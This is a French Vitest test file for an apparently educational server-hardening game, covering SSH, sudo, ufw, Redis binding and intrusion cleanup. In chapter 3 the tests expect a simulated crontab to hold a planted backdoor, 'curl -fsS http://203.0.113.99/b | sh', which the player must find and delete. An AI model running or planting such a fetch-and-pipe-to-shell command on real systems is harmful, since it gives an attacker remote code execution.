// L'Audit : le serveur du Fournil (le rapport, l'exposition, les traces).
// Rejoué avec la console, dans chaque langue.

import { describe, expect, it } from 'vitest';
import { Console } from '../src/moteur/console';
import { HISTOIRES } from '../src/moteur/chapitres';
import { LANGUES, LANGUE_DE_REFERENCE, traducteur } from '../src/textes';
import { dansLaLangue } from './noms';

const EFFACEUR = HISTOIRES.find((h) => h.id === 'effaceur')!.chapitres.map((c) => c.id);
const MDP = 'farine-2028';

for (const langue of LANGUES)
  describe(`L'Audit — ${langue}`, () => {
    const fr = langue === LANGUE_DE_REFERENCE;
    const L = (ligne: string) => dansLaLangue(traducteur(langue), ligne);
    const contient = (tout: string, texte: string) => fr && expect(tout).toContain(texte);
    const partie = (termines: string[] = []) => {
      const c = new Console({ langue, termines: [...EFFACEUR, ...termines] });
      const une = (l: string) => {
        let sortie = c.executer(L(l)) ?? '';
        if (c.shell.attente) sortie += '\n' + (c.executer(MDP) ?? '');
        return sortie;
      };
      const jouer = (lignes: string[]) => lignes.map(une).join('\n');
      const editer = (commande: string, changer: (texte: string) => string) => {
        une(commande);
        c.enregistrer(changer(c.edition!.texte));
        return c.quitterEdition();
      };
      jouer(['ssh fournil', 'yes']);
      return { c, jouer, editer };
    };

    it('chapitre 1 — solution : root fermé, Lucas supprimé, sudo avec mot de passe, secret en 600', () => {
      const { c, jouer, editer } = partie();
      let tout = jouer(['cat rapport-audit.txt', 'sudo -l', 'ls -l /srv/commandes']);
      contient(tout, 'RAPPORT D\'AUDIT');
      expect(tout).toContain('NOPASSWD');
      // Au début, aucun constat n'est traité.
      for (const id of ['ssh', 'compte', 'sudo', 'secret']) expect(c.shell.drapeaux.has(id), id).toBe(false);
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      jouer(['sudo sshd -t', 'sudo systemctl reload ssh']);
      expect(c.termines).not.toContain('rapport');
      jouer(['sudo userdel lucas', 'sudo rm /etc/sudoers.d/90-cloud-init-users', 'sudo chmod 600 /srv/commandes/.env']);
      tout = jouer(['sudo -l']);
      expect(tout).not.toContain('NOPASSWD');
      expect(c.termines).toContain('rapport');
    });

    it('chapitre 1 — une autre solution : verrouiller et expirer Lucas, visudo, chmod 640', () => {
      const { c, jouer, editer } = partie();
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      jouer(['sudo systemctl reload ssh', 'sudo usermod -L -e 1 lucas', 'sudo gpasswd -d lucas sudo']);
      editer('sudo nano /etc/sudoers.d/90-cloud-init-users', () => 'vous ALL=(ALL) ALL');
      jouer(['sudo chmod 640 /srv/commandes/.env']);
      expect(c.termines).toContain('rapport');
    });

    it('chapitre 1 — fausses pistes : fichier modifié sans recharger, compte à moitié fermé, secret fermé à l’appli', () => {
      const { c, jouer, editer } = partie();
      const e = (id: string) => c.shell.drapeaux.has(id);
      editer('sudo nano /etc/ssh/sshd_config', (t) => t.replace('PermitRootLogin yes', 'PermitRootLogin no'));
      expect(e('sans-effet')).toBe(true);
      jouer(['sudo usermod -L lucas']);
      expect(e('compte-incomplet')).toBe(true);
      jouer(['sudo chown root:root /srv/commandes/.env', 'sudo chmod 600 /srv/commandes/.env']);
      expect(e('appli-aveugle')).toBe(true);
      expect(c.termines).not.toContain('rapport');
    });

    // Le chapitre 2 : la partie commence quand « Le rapport » est terminé.
    const REDIS = '/etc/redis/redis.conf';
    const redisLocal = (t: string) => t.replace('bind * -::*', 'bind 127.0.0.1 -::1');

    it('chapitre 2 — solution : ss, ufw (SSH et le site d’abord), Redis en local, reconnexion', () => {
      const { c, jouer, editer } = partie(['rapport']);
      let tout = jouer(['cat balayage-audit.txt', 'sudo ss -tlnp']);
      expect(tout).toContain('0.0.0.0:6379');
      expect(tout).toContain('127.0.0.1:3000');
      jouer(['sudo ufw allow OpenSSH', 'sudo ufw allow "Nginx Full"', 'sudo ufw enable', 'y']);
      expect(c.termines).not.toContain('exposition');
      editer(`sudo nano ${REDIS}`, redisLocal);
      jouer(['sudo systemctl restart redis-server']);
      tout = jouer(['sudo ss -tln', 'sudo ufw status verbose']);
      expect(tout).toContain('127.0.0.1:6379');
      expect(c.termines).not.toContain('exposition');
      jouer(['exit', 'ssh fournil']);
      expect(c.termines).toContain('exposition');
    });

    it('chapitre 2 — une autre solution : règles par numéro de port, SSH depuis le poste seulement', () => {
      const { c, jouer, editer } = partie(['rapport']);
      editer(`sudo nano ${REDIS}`, (t) => t.replace('bind * -::*', 'bind 127.0.0.1'));
      jouer([
        'sudo systemctl restart redis-server',
        'sudo ufw default deny incoming',
        'sudo ufw allow from 192.0.2.2 to any port 22 proto tcp',
        'sudo ufw allow 80/tcp',
        'sudo ufw allow 443/tcp',
        'sudo ufw enable',
        'y',
        'exit',
        'ssh fournil',
      ]);
      expect(c.termines).toContain('exposition');
    });

    it('chapitre 2 — fausses pistes : activer sans SSH, couper le site, tout autoriser, arrêter Redis, oublier le redémarrage', () => {
      const { c, jouer, editer } = partie(['rapport']);
      const e = (id: string) => c.shell.drapeaux.has(id);
      jouer(['sudo ufw allow 80/tcp', 'sudo ufw allow 443/tcp', 'sudo ufw enable', 'y']);
      expect(e('enferme')).toBe(true);
      jouer(['sudo ufw disable', 'sudo ufw delete allow 80/tcp', 'sudo ufw allow OpenSSH', 'sudo ufw enable', 'y']);
      expect(e('site-coupe')).toBe(true);
      jouer(['sudo ufw allow 80/tcp', 'sudo ufw allow 443/tcp', 'sudo ufw allow 6379/tcp']);
      expect(e('base-ouverte')).toBe(true);
      jouer(['sudo systemctl stop redis-server']);
      expect(e('redis-arrete')).toBe(true);
      jouer(['sudo systemctl start redis-server']);
      editer(`sudo nano ${REDIS}`, redisLocal);
      expect(e('sans-effet')).toBe(true);
      expect(c.termines).not.toContain('exposition');
    });

    // Le chapitre 3 : la partie commence quand « L'exposition » est terminé.
    const CLES = '/home/nadia/.ssh/authorized_keys';
    const sansIntruse = (t: string) => t.split('\n').filter((l) => !l.includes('nadia@portable')).join('\n');
    const sansBalise = (t: string) => t.split('\n').filter((l) => !l.includes('203.0.113.99')).join('\n');

    it('chapitre 3 — solution : journal, last, empreinte, clé retirée, crontab nettoyée', () => {
      const { c, jouer, editer } = partie(['rapport', 'exposition']);
      let tout = jouer(['last nadia', 'journalctl -u ssh | grep Accepted']);
      expect(tout).toContain('203.0.113.99');
      expect(tout).toContain('Accepted publickey for nadia from 203.0.113.99 port 52144 ssh2: ED25519 SHA256:');
      tout = jouer([`sudo ssh-keygen -l -f ${CLES}`]);
      expect(tout).toContain('nadia@boutique (ED25519)');
      expect(tout).toContain('nadia@portable (ED25519)');
      editer(`sudo nano ${CLES}`, sansIntruse);
      expect(c.termines).not.toContain('traces');
      tout = jouer(['sudo crontab -u nadia -l']);
      expect(tout).toContain('curl -fsS http://203.0.113.99/b | sh');
      editer('sudo crontab -u nadia -e', sansBalise);
      tout = jouer(['sudo crontab -u nadia -l']);
      expect(tout).toContain('sauvegarde.sh');
      expect(tout).not.toContain('203.0.113.99');
      expect(c.termines).toContain('traces');
    });

    it('chapitre 3 — fausses pistes : tout effacer (Nadia dehors, sauvegarde perdue)', () => {
      const { c, jouer, editer } = partie(['rapport', 'exposition']);
      const e = (id: string) => c.shell.drapeaux.has(id);
      editer(`sudo nano ${CLES}`, () => '');
      expect(e('nadia-enfermee')).toBe(true);
      editer(`sudo nano ${CLES}`, (t) => t + '\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA x@y');
      jouer(['sudo crontab -u nadia -r']);
      expect(e('sauvegarde-perdue')).toBe(true);
      expect(c.termines).not.toContain('traces');
    });
  });
